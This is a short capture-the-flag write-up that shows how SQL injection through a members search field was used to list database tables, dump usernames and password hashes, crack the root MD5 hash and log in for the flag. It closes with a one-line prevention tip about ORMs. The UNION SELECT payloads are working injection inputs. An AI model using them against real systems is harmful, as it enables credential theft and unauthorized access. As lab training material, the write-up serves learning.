# 01_sign_in

### Instructions

This query returns all available columns in the db
`1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`
And this query allows to check all tables
`1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.columns`

We have noticed that members page has sql search input
Using next query we get users creditianals
`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
Decripting password of root user using MD5 we got the password: shadow. We logged in in the sign_in page and we got the flag.

### How to prevent

From my point of view the best solution is using ORMs.
Btw it lets avoid using direct sql from browser
